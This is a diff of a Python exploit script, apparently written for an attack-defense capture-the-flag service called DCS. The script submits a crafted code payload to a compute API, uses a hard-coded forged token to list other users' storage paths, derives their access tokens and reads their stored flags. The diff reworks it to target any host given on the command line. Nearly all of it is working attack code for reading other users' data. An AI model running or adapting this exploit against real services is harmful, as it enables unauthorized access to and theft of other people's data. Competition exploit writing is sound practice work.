@@ -1,5 +1,10 @@
+#!/usr/bin/env python3
+
 import json
-import requests
+import hashlib
+import sys
+
+import api
 
 code = '''
 a3b5c = 9.01665960969080694903108994646e-308;
@@ -49,33 +54,36 @@ fun main() {
 }
 '''
 
-with requests.post('http://localhost:7654/api/compute', json={'description': 'PWNED', 'code': code}) as r:
-    print(r, r.content)
-    assert(r.status_code == 201)
-    token = r.headers['X-DCS-Token']
+PORT = 7654
+HOSTNAME = sys.argv[1]
+FLAG_ID = sys.argv[2]
 
-with requests.get('http://localhost:7654/api/compute', headers={'X-DCS-Token': token}) as r:
-    print(r, r.content)
-    assert(r.status_code == 200)
 
-with requests.get('http://localhost:7654/api/compute', headers={'X-DCS-Token': 'ructfructfructfructfructfructfru'}) as r:
-    print(r, r.content)
-    assert(r.status_code == 200)
+def sha256(s: str) -> str:
+    return hashlib.sha256(s.encode('utf-8')).hexdigest()
 
-    paths = json.loads(r.content.decode('utf-8'))["description"]
-    def get_token_from_path(p):
-        l = p.split('/')
-        if len(l) < 2:
-            return ''
-        return l[-2] + l[-1]
-    victim_tokens = list(map(get_token_from_path, paths.split('\n')))
 
-for t in victim_tokens:
-    if t == '':
-        continue
+if __name__ == '__main__':
+    with api.DCSClient(HOSTNAME, PORT) as c:
+        r = c.create(code, 'PWNED')
+        assert(r.error == '')
 
-    with requests.get('http://localhost:7654/api/compute', headers={'X-DCS-Token': t}) as r:
-        assert(r.status_code == 200)
+        r = c.get()
+        assert(r.error == '')
 
-        f = json.loads(r.content.decode('utf-8'))["description"]
-        print(f"stealed flag: {f}")
+        r = c.get('ructfructfructfructfructfructfru')
+        assert(r.error == '')
+
+        paths = r.description
+        def get_token_from_path(p):
+            l = p.split('/')
+            if len(l) < 2:
+                return ''
+            return l[-2] + l[-1]
+        victim_tokens = list(map(get_token_from_path, paths.split('\n')))
+
+        for t in victim_tokens:
+            if sha256(t) == FLAG_ID:
+                r = c.get(t)
+                assert(r.error == '')
+                print(r.description)
